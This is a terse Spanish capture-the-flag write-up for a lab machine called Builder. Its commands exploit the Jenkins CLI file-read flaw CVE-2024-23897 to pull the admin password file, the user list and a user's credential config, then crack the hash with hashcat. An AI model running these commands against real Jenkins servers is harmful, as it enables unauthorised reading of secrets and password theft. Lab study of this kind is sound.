---
title: "Builder"
---

# Builder

Jenkins

El .jar para usar la cli de jenkins está en :

```bash
wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
```

CVE-2024-23897

```bash
java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help '@/etc/hostname' a
```

```bash
java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help '@/var/jenkins_home/user.txt' a
```

Jenkins suele guardar la contraseña iniciar en:

```bash
/var/jenkins_home/secrets/initialAdminPassword
java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help '@/var/jenkins_home/secrets/initialAdminPassword' a
```

Usuarios en:

```bash
/var/jenkins_home/users/users.xml
java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' reload-job '@/var/jenkins_home/users/users.xml'
```

Y credenciales en :

```bash
/var/jenkins_home/users/jennifer_12108429903186576833/config.xml
java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' reload-job '@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'
```

```bash
hashcat -m 3200 jennifer_hash --user /usr/share/wordlist/rockyou.txt
```
